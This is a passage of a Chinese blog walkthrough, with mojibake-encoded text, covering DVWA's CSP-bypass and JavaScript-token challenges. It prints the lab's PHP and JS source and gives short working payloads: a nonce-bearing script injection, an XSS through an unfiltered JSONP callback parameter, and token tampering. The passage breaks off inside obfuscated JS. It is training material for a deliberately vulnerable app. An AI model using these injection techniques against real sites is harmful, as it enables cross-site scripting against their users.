method=&quot;POST&quot;&gt;</span><br><span class="hljs-string">    &lt;p&gt;Whatever you enter here gets dropped directly into the page, see if you can get an alert box to pop up.&lt;/p&gt;</span><br><span class="hljs-string">    &lt;input size=&quot;50&quot; type=&quot;text&quot; name=&quot;include&quot; value=&quot;&quot; id=&quot;include&quot; /&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;submit&quot; value=&quot;Include&quot; /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&#x27;</span>;<br><br></code></pre></td></tr></table></figure>

<p>httpå¤´ä¿¡æ¯ä¸­çš„script-srcçš„åˆæ³•æ¥æºå‘ç”Ÿäº†å˜åŒ–ï¼Œä»–æ²¡æœ‰ä½¿ç”¨ä¿¡ä»»ç½‘ç«™è€Œæ˜¯ä¸¤ä¸ªå†…è”ï¼š<br>unsafe-inlineï¼Œå…è®¸ä½¿ç”¨å†…è”èµ„æºï¼Œå¦‚å†…è”< script>å…ƒç´ ï¼Œjavascript:URLï¼Œå†…è”äº‹ä»¶å¤„ç†ç¨‹åºï¼ˆå¦‚onclickï¼‰å’Œå†…è”< style>å…ƒç´ ã€‚å¿…é¡»åŒ…æ‹¬å•å¼•å·ã€‚<br>nonce-sourceï¼Œä»…å…è®¸ç‰¹å®šçš„å†…è”è„šæœ¬å—ï¼Œnonce=â€œTmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXAâ€<br>æ„æ€æ˜¯åªèƒ½ä½¿ç”¨scriptå…ƒç´ ä¸”è„šæœ¬å—å€¼nonceå€¼ä¸ºTmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA<br>ç»“æœï¼š<br>æ„é€ ä¸€ä¸ªæ ‡ç­¾ï¼Œè¾“å…¥</p>
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">alert('1')</script>

</p><h3 id="high-8"><a href="#high-8" class="headerlink" title="high"></a>high</h3><p>æºç å¦‚ä¸‹ï¼Œè™½ç„¶æ­¤æ—¶åç«¯å·²ç»æ²¡æœ‰è®¾ç½®ç™½åå•ï¼Œä½†æ˜¯è¿˜æ˜¯ä¼šç”¨ POST æ–¹æ³•ä¼ å…¥ include å‚æ•°ã€‚</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php">Copy Highlighter-hljs<span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$headerCSP</span> = <span class="hljs-string">&quot;Content-Security-Policy: script-src &#x27;self&#x27;;&quot;</span>;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-variable">$headerCSP</span>);<br><br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>])) &#123;<br><span class="hljs-variable">$page</span>[<span class="hljs-string">&#x27;body&#x27;</span>] .= <span class="hljs-string">&quot;</span><br><span class="hljs-string">    &quot;</span> . <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;include&#x27;</span>] . <span class="hljs-string">&quot;</span><br><span class="hljs-string">&quot;</span>;<br>&#125;<br><span class="hljs-variable">$page</span>[ <span class="hljs-string">&#x27;body&#x27;</span> ] .= <span class="hljs-string">&#x27;</span><br><span class="hljs-string">&lt;form name=&quot;csp&quot; method=&quot;POST&quot;&gt;</span><br><span class="hljs-string">    &lt;p&gt;The page makes a call to &#x27;</span> . DVWA_WEB_PAGE_TO_ROOT . <span class="hljs-string">&#x27;/vulnerabilities/csp/source/jsonp.php to load some code. Modify that page to run your own code.&lt;/p&gt;</span><br><span class="hljs-string">    &lt;p&gt;1+2+3+4+5=&lt;span id=&quot;answer&quot;&gt;&lt;/span&gt;&lt;/p&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;button&quot; id=&quot;solve&quot; value=&quot;Solve the sum&quot; /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;script src=&quot;source/high.js&quot;&gt;&lt;/script&gt;</span><br><span class="hljs-string">&#x27;</span>;<br></code></pre></td></tr></table></figure>

<p>æºç å¦‚ä¸‹ï¼Œåœ¨ç‚¹å‡»ç½‘é¡µçš„æŒ‰é’®ä½¿ js ç”Ÿæˆä¸€ä¸ª script æ ‡ç­¾ï¼Œsrc æŒ‡å‘ source/jsonp.php?callback=solveNumã€‚<strong>document å¯¹è±¡</strong>ä½¿æˆ‘ä»¬å¯ä»¥ä»è„šæœ¬ä¸­å¯¹ HTML é¡µé¢ä¸­çš„æ‰€æœ‰å…ƒç´ è¿›è¡Œè®¿é—®ï¼Œ<strong>createElement()</strong> æ–¹æ³•é€šè¿‡æŒ‡å®šåç§°åˆ›å»ºä¸€ä¸ªå…ƒç´ ï¼Œ<strong>body å±æ€§</strong>æä¾›å¯¹ < body > å…ƒç´ çš„ç›´æ¥è®¿é—®ï¼Œå¯¹äºå®šä¹‰äº†æ¡†æ¶é›†çš„æ–‡æ¡£å°†å¼•ç”¨æœ€å¤–å±‚çš„ < frameset >ã€‚<strong>appendChild()</strong> æ–¹æ³•å¯å‘èŠ‚ç‚¹çš„å­èŠ‚ç‚¹åˆ—è¡¨çš„æœ«å°¾æ·»åŠ æ–°çš„å­èŠ‚ç‚¹ï¼Œä¹Ÿå°±æ˜¯ç½‘é¡µä¼šæŠŠ â€œsource/jsonp.php?callback=solveNumâ€ åŠ å…¥åˆ° DOM ä¸­ã€‚<br>æºç ä¸­å®šä¹‰äº† solveNum çš„å‡½æ•°ï¼Œå‡½æ•°ä¼ å…¥å‚æ•° objï¼Œå¦‚æœå­—ç¬¦ä¸² â€œanswerâ€ åœ¨ obj ä¸­å°±ä¼šæ‰§è¡Œã€‚<strong>getElementById() æ–¹æ³•</strong>å¯è¿”å›å¯¹æ‹¥æœ‰æŒ‡å®š ID çš„ç¬¬ä¸€ä¸ªå¯¹è±¡çš„å¼•ç”¨ï¼Œ<strong>innerHTML å±æ€§</strong>è®¾ç½®æˆ–è¿”å›è¡¨æ ¼è¡Œçš„å¼€å§‹å’Œç»“æŸæ ‡ç­¾ä¹‹é—´çš„ HTMLã€‚è¿™é‡Œçš„ script æ ‡ç­¾ä¼šæŠŠè¿œç¨‹åŠ è½½çš„ solveSum({"answer":"15"}) å½“ä½œ js ä»£ç æ‰§è¡Œï¼Œ ç„¶åè¿™ä¸ªå‡½æ•°å°±ä¼šåœ¨é¡µé¢æ˜¾ç¤ºç­”æ¡ˆã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-title class_">Copy</span> <span class="hljs-title class_">Highlighter</span>-hljs<span class="hljs-keyword">function</span> <span class="hljs-title function_">clickButton</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">var</span> s = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">createElement</span>(<span class="hljs-string">&quot;script&quot;</span>);<br>    s.<span class="hljs-property">src</span> = <span class="hljs-string">&quot;source/jsonp.php?callback=solveSum&quot;</span>;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-property">body</span>.<span class="hljs-title function_">appendChild</span>(s);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">solveSum</span>(<span class="hljs-params">obj</span>) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;answer&quot;</span> <span class="hljs-keyword">in</span> obj) &#123;<br>        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;answer&quot;</span>).<span class="hljs-property">innerHTML</span> = obj[<span class="hljs-string">&#x27;answer&#x27;</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">var</span> solve_button = <span class="hljs-variable language_">document</span>.<span class="hljs-property">getElementById</span> (<span class="hljs-string">&quot;solve&quot;</span>);<br><br><span class="hljs-keyword">if</span> (solve_button) &#123;<br>    solve_button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title function_">clickButton</span>();<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>æ³¨æ„åˆ°éœ€è¦å‘ â€œsource/jsonp.phpâ€ ä¼ å…¥ â€œcallbackâ€ å‚æ•°ï¼Œè¿™ä¸ªå‚æ•°å¹¶æ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡è¿™ä¸ªå‚æ•°è¿›è¡Œæ³¨å…¥ã€‚</p>
<p>include=<script src="source/jsonp.php?callback=alert('xss');"></script></p>
<h2 id="javascript"><a href="#javascript" class="headerlink" title="javascript"></a>javascript</h2><h3 id="low-12"><a href="#low-12" class="headerlink" title="low"></a>low</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$page</span>[<span class="hljs-string">&#x27;body&#x27;</span>] .= <span class="hljs-string">&lt;&lt;&lt;EOF</span><br><span class="hljs-string">&lt;script&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*</span><br><span class="hljs-string">MD5 code from here</span><br><span class="hljs-string">https://github.com/blueimp/JavaScript-MD5</span><br><span class="hljs-string">*/</span><br><span class="hljs-string"></span><br><span class="hljs-string">!function(n)&#123;&quot;use strict&quot;;function t(n,t)&#123;var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r&#125;function r(n,t)&#123;return n&lt;&lt;t|n&gt;&gt;&gt;32-t&#125;function e(n,e,o,u,c,f)&#123;return t(r(t(t(e,n),t(u,f)),c),o)&#125;function o(n,t,r,o,u,c,f)&#123;return e(t&amp;r|~t&amp;o,n,t,u,c,f)&#125;function u(n,t,r,o,u,c,f)&#123;return e(t&amp;o|r&amp;~o,n,t,u,c,f)&#125;function c(n,t,r,o,u,c,f)&#123;return e(t^r^o,n,t,u,c,f)&#125;function f(n,t,r,o,u,c,f)&#123;return e(r^(t|~o),n,t,u,c,f)&#125;function i(n,r)&#123;n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]&#125;function a(n)&#123;var t,r=&quot;&quot;,e=32*n.length;for(t=0;t&lt;e;t+=8)r+=String.fromCharCode(n[t&gt;&gt;5]&gt;&gt;&gt;t%32&amp;255);return r&#125;function d(n)&#123;var t,r=[];for(r[(n.length&gt;&gt;2)-1]=void 0,t=0;t&lt;r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t&lt;e;t+=8)r[t&gt;&gt;5]|=(255&amp;n.charCodeAt(t/8))&lt;&lt;t%32;return r&#125;function h(n)&#123;return a(i(d(n),8*n.length))&#125;function l(n,t)&#123;var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length&gt;16&amp;&amp;(o=i(o,8*n.length)),r=0;r&lt;16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))&#125;function g(n)&#123;var t,r,e=&quot;&quot;;for(r=0;r&lt;n.length;r+=1)t=n.charCodeAt(r),e+=&quot;0123456789abcdef&quot;.charAt(t&gt;&gt;&gt;4&amp;15)+&quot;0123456789abcdef&quot;.charAt(15&amp;t);return e&#125;function v(n)&#123;return unescape(encodeURIComponent(n))&#125;function m(n)&#123;return h(v(n))&#125;function p(n)&#123;return g(m(n))&#125;function s(n,t)&#123;return l(v(n),v(t))&#125;function C(n,t)&#123;return g(s(n,t))&#125;function A(n,t,r)&#123;return t?r?s(t,n):C(t,n):r?m(n):p(n)&#125;&quot;function&quot;==typeof define&amp;&amp;define.amd?define(function()&#123;return A&#125;):&quot;object&quot;==typeof module&amp;&amp;module.exports?module.exports=A:n.md5=A&#125;(this);</span><br><span class="hljs-string"></span><br><span class="hljs-string">    function rot13(inp) &#123;</span><br><span class="hljs-string">        return inp.replace(/[a-zA-Z]/g,function(c)&#123;return String.fromCharCode((c&lt;=&quot;Z&quot;?90:122)&gt;=(c=c.charCodeAt(0)+13)?c:c-26);&#125;);</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    function generate_token() &#123;</span><br><span class="hljs-string">        var phrase = document.getElementById(&quot;phrase&quot;).value;</span><br><span class="hljs-string">        document.getElementById(&quot;token&quot;).value = md5(rot13(phrase));</span><br><span class="hljs-string">    &#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    generate_token();</span><br><span class="hljs-string">&lt;/script&gt;</span><br><span class="hljs-string">EOF</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>



<p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240201001905159.png" srcset="/img/loading.gif" lazyload alt="image-20240201001905159"></p>
<p>ç›´æ¥æäº¤successçš„è¯ï¼Œæ˜¯ä¸å¯èƒ½æˆåŠŸçš„ï¼Œå› ä¸ºæäº¤çš„tokenå€¼ï¼Œæ˜¯å­—ç¬¦ä¸²ChangeMeè¿›è¡Œmd5åŠ å¯†åçš„tokenå€¼ï¼Œè€Œä¸æ˜¯successè¿›è¡Œmd5åŠ å¯†åçš„tokenå€¼</p>
<p>æ ¹æ®æºç å®¡è®¡çš„ç»“æœï¼Œtoken çš„ç”Ÿæˆæ˜¯åŸºäº phrase å‚æ•°çš„ï¼Œè€Œç°åœ¨è¯¥å‚æ•°å·²ç»è¢«æˆ‘ä»¬è¦†ç›–äº†ã€‚å› æ­¤ç°åœ¨æˆ‘ä»¬é‡æ–°æ‹‰å–ä¸€ä¸‹ tokenï¼Œåœ¨ Web æ§åˆ¶å°è¿è¡Œgenerate_token() å‡½æ•°ã€‚</p>
<p>å¦‚æœè¿è¡Œ generate_token() å‡½æ•°ä»ç„¶æ³¨å…¥å¤±è´¥ï¼Œå¯ä»¥åœ¨åŒ…ä¸­æ‰‹åŠ¨ä¿®æ”¹ tokenã€‚</p>
<p>md5(rot13(â€œChangemeâ€)) </p>
<p>md5(rot13(â€œsuccessâ€))</p>
<h3 id="medium-11"><a href="#medium-11" class="headerlink" title="medium"></a>medium</h3><p>æ”»å‡»çš„æ–¹æ³•å’Œ low å·®ä¸å¤šï¼Œé¦–å…ˆæ³¨å…¥ â€œsuccessâ€ ä¹‹åæŠ“åŒ…çœ‹çœ‹ï¼Œç°åœ¨çš„ token æ˜¯ â€œXXChangMeXXâ€ çš„åè½¬ã€‚</p>
<p><img src="/2024/01/19/DVWA%E5%A5%87%E5%A6%99%E4%B9%8B%E6%97%85/image-20240201003942089.png" srcset="/img/loading.gif" lazyload alt="image-20240201003942089"></p>
<p>æ§åˆ¶å°è¿è¡Œä¸‹ do_elsesomething(â€œXXâ€) å‡½æ•°ï¼Œå†æ¬¡æ³¨å…¥ â€œsuccessâ€ å³å¯</p>
<h3 id="high-9"><a href="#high-9" class="headerlink" title="high"></a>high</h3><p>æºç ä½¿ç”¨äº†jsæ··æ·†</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">var</span> a=[&#x27;fromCharCode&#x27;,&#x27;toString&#x27;,&#x27;replace&#x27;,&#x27;BeJ&#x27;,&#x27;\x5cw+&#x27;,&#x27;Lyg&#x27;,&#x27;SuR&#x27;,&#x27;(w()&#123;\x273M\x203L\x27;q\x201l=\x273K\x203I\x203J\x20T\x27;q\x201R=<span class="hljs-number">1</span>c\x202I===\x271n\x27;q\x20Y=<span class="hljs-number">1</span>R?<span class="hljs-number">2</span>I:&#123;&#125;;p(Y.<span class="hljs-number">3</span>N)&#123;<span class="hljs-number">1</span>R=<span class="hljs-number">1</span>O&#125;q\x202L=!<span class="hljs-number">1</span>R&amp;&amp;<span class="hljs-number">1</span>c\x202M===\x271n\x27;q\x202o=!Y.<span class="hljs-number">2</span>S&amp;&amp;<span class="hljs-number">1</span>c\x202d===\x271n\x27&amp;&amp;<span class="hljs-number">2</span>d.<span class="hljs-number">2</span>Q&amp;&amp;<span class="hljs-number">2</span>d.<span class="hljs-number">2</span>Q.<span class="hljs-number">3</span>S;p(<span class="hljs-number">2</span>o)&#123;Y=<span class="hljs-number">3</span>R&#125;z\x20p(<span class="hljs-number">2</span>L)&#123;Y=<span class="hljs-number">2</span>M&#125;q\x202G=!Y.<span class="hljs-number">3</span>Q&amp;&amp;<span class="hljs-number">1</span>c\x202g===\x271n\x27&amp;&amp;<span class="hljs-number">2</span>g.X;q\x202s=<span class="hljs-number">1</span>c\x202l===\x27w\x27&amp;&amp;<span class="hljs-number">2</span>l.<span class="hljs-number">3</span>P;q\x201y=!Y.<span class="hljs-number">3</span>H&amp;&amp;<span class="hljs-number">1</span>c\x20Z!==\x272T\x27;q\x20m=\x273G\x27.<span class="hljs-number">3</span>z(\x27\x27);q\x202w=[-<span class="hljs-number">3</span>y,<span class="hljs-number">3</span>x,<span class="hljs-number">3</span>v,<span class="hljs-number">3</span>w];q\x20U=[<span class="hljs-number">24</span>,<span class="hljs-number">16</span>,<span class="hljs-number">8</span>,<span class="hljs-number">0</span>];q\x20K=[<span class="hljs-number">3</span>A,<span class="hljs-number">3</span>B,<span class="hljs-number">3</span>F,<span class="hljs-number">3</span>E,<span class="hljs-number">3</span>D,<span class="hljs-number">3</span>C,<span class="hljs-number">3</span>T,<span class="hljs-number">3</span>U,<span class="hljs-number">4</span>d,<span class="hljs-number">4</span>c,<span class="hljs-number">4</span>b,<span class="hljs-number">49</span>,<span class="hljs-number">4</span>a,<span class="hljs-number">4</span>e,<span class="hljs-number">4</span>f,<span class="hljs-number">4</span>j,<span class="hljs-number">4</span>i,<span class="hljs-number">4</span>h,<span class="hljs-number">3</span>u,<span class="hljs-number">48</span>,<span class="hljs-number">47</span>,<span class="hljs-number">3</span>Z,<span class="hljs-number">3</span>Y,<span class="hljs-number">3</span>X,<span class="hljs-number">3</span>V,<span class="hljs-number">3</span>W,<span class="hljs-number">40</span>,<span class="hljs-number">41</span>,<span class="hljs-number">46</span>,<span class="hljs-number">45</span>,<span class="hljs-number">43</span>,<span class="hljs-number">42</span>,<span class="hljs-number">4</span>k,<span class="hljs-number">3</span>f,<span class="hljs-number">38</span>,<span class="hljs-number">36</span>,<span class="hljs-number">39</span>,<span class="hljs-number">37</span>,<span class="hljs-number">34</span>,<span class="hljs-number">33</span>,<span class="hljs-number">2</span>Y,<span class="hljs-number">31</span>,<span class="hljs-number">2</span>Z,<span class="hljs-number">35</span>,<span class="hljs-number">3</span>t,<span class="hljs-number">3</span>n,<span class="hljs-number">3</span>m,<span class="hljs-number">3</span>l,<span class="hljs-number">3</span>o,<span class="hljs-number">3</span>p,<span class="hljs-number">3</span>s,<span class="hljs-number">3</span>r,<span class="hljs-number">3</span>q,<span class="hljs-number">3</span>k,<span class="hljs-number">3</span>j,<span class="hljs-number">3</span>d,<span class="hljs-number">3</span>a,<span class="hljs-number">3</span>c,<span class="hljs-number">3</span>b,<span class="hljs-number">3</span>e,<span class="hljs-number">3</span>h,<span class="hljs-number">3</span>g,<span class="hljs-number">3</span>i,<span class="hljs-number">4</span>g];q\x201E=[\x271e\x27,\x2727\x27,\x271G\x27,\x272R\x27];q\x20l=[];p(Y.<span class="hljs-number">2</span>S||!<span class="hljs-number">1</span>z.<span class="hljs-number">1</span>K)&#123;<span class="hljs-number">1</span>z.<span class="hljs-number">1</span>K=w(<span class="hljs-number">1</span>x)&#123;A\x204C.Q.<span class="hljs-number">2</span>U.<span class="hljs-number">1</span>I(<span class="hljs-number">1</span>x)===\x27[<span class="hljs-number">1</span>n\x201z]\x27&#125;&#125;p(<span class="hljs-number">1</span>y&amp;&amp;(Y.<span class="hljs-number">50</span>||!Z.<span class="hljs-number">1</span>N))&#123;Z.<span class="hljs-number">1</span>N=w(<span class="hljs-number">1</span>x)&#123;A\x201c\x201x===\x271n\x27&amp;&amp;<span class="hljs-number">1</span>x.<span class="hljs-number">1</span>w&amp;&amp;<span class="hljs-number">1</span>x.<span class="hljs-number">1</span>w.<span class="hljs-number">1</span>J===Z&#125;&#125;q\x202m=w(<span class="hljs-number">1</span>X,x)&#123;A\x20w(s)&#123;A\x20O\x20N(x,<span class="hljs-number">1</span>d).S(s)[<span class="hljs-number">1</span>X]()&#125;&#125;;q\x202a=w(x)&#123;q\x20P=<span class="hljs-number">2</span>m(\x271e\x27,x);p(<span class="hljs-number">2</span>o)&#123;P=<span class="hljs-number">2</span>P(P,x)&#125;P.<span class="hljs-number">1</span>T=w()&#123;A\x20O\x20N(x)&#125;;P.S=w(s)&#123;A\x20P.<span class="hljs-number">1</span>T().S(s)&#125;;<span class="hljs-number">1</span>g(q\x20i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">1</span>E.W;++i)&#123;q\x20T=<span class="hljs-number">1</span>E[i];P[T]=<span class="hljs-number">2</span>m(T,x)&#125;A\x20P&#125;;q\x202P=w(P,x)&#123;q\x201S=<span class="hljs-number">2</span>O(\x222N(\x271S\x27)\x22);q\x201Y=<span class="hljs-number">2</span>O(\x222N(\x271w\x27).<span class="hljs-number">1</span>Y\x22);q\x202n=x?\x271H\x27:\x271q\x27;q\x202z=w(s)&#123;p(<span class="hljs-number">1</span>c\x20s===\x272p\x27)&#123;A\x201S.<span class="hljs-number">2</span>x(<span class="hljs-number">2</span>n).S(s,\x274S\x27).<span class="hljs-number">1</span>G(\x271e\x27)&#125;z&#123;p(s===<span class="hljs-number">2</span>q||s===<span class="hljs-number">2</span>T)&#123;<span class="hljs-number">1</span>u\x20O\x201t(<span class="hljs-number">1</span>l)&#125;z\x20p(s.<span class="hljs-number">1</span>J===Z)&#123;s=O\x202r(s)&#125;&#125;p(<span class="hljs-number">1</span>z.<span class="hljs-number">1</span>K(s)||Z.<span class="hljs-number">1</span>N(s)||s.<span class="hljs-number">1</span>J===<span class="hljs-number">1</span>Y)&#123;A\x201S.<span class="hljs-number">2</span>x(<span class="hljs-number">2</span>n).S(O\x201Y(s)).<span class="hljs-number">1</span>G(\x271e\x27)&#125;z&#123;A\x20P(s)&#125;&#125;;A\x202z&#125;;q\x202k=w(<span class="hljs-number">1</span>X,x)&#123;A\x20w(G,s)&#123;A\x20O\x201P(G,x,<span class="hljs-number">1</span>d).S(s)[<span class="hljs-number">1</span>X]()&#125;&#125;;q\x202f=w(x)&#123;q\x20P=<span class="hljs-number">2</span>k(\x271e\x27,x);P.<span class="hljs-number">1</span>T=w(G)&#123;A\x20O\x201P(G,x)&#125;;P.S=w(G,s)&#123;A\x20P.<span class="hljs-number">1</span>T(G).S(s)&#125;;<span class="hljs-number">1</span>g(q\x20i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">1</span>E.W;++i)&#123;q\x20T=<span class="hljs-number">1</span>E[i];P[T]=<span class="hljs-number">2</span>k(T,x)&#125;A\x20P&#125;;w\x20N(x,<span class="hljs-number">1</span>v)&#123;p(<span class="hljs-number">1</span>v)&#123;l[<span class="hljs-number">0</span>]=l[<span class="hljs-number">16</span>]=l[<span class="hljs-number">1</span>]=l[<span class="hljs-number">2</span>]=l[<span class="hljs-number">3</span>]=l[<span class="hljs-number">4</span>]=l[<span class="hljs-number">5</span>]=l[<span class="hljs-number">6</span>]=l[<span class="hljs-number">7</span>]=l[<span class="hljs-number">8</span>]=l[<span class="hljs-number">9</span>]=l[<span class="hljs-number">10</span>]=l[<span class="hljs-number">11</span>]=l[<span class="hljs-number">12</span>]=l[<span class="hljs-number">13</span>]=l[<span class="hljs-number">14</span>]=l[<span class="hljs-number">15</span>]=<span class="hljs-number">0</span>;k.l=l&#125;z&#123;k.l=[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]&#125;p(x)&#123;k.C=<span class="hljs-number">4</span>I;k.B=<span class="hljs-number">4</span>H;k.E=<span class="hljs-number">4</span>l;k.F=<span class="hljs-number">4</span>U;k.J=<span class="hljs-number">4</span>J;k.I=<span class="hljs-number">4</span>K;k.H=<span class="hljs-number">4</span>L;k.D=<span class="hljs-number">4</span>T&#125;z&#123;k.C=<span class="hljs-number">4</span>X;k.B=<span class="hljs-number">4</span>W;k.E=<span class="hljs-number">4</span>Y;k.F=<span class="hljs-number">4</span>Z;k.J=<span class="hljs-number">4</span>V;k.I=<span class="hljs-number">4</span>O;k.H=<span class="hljs-number">4</span>F;k.D=<span 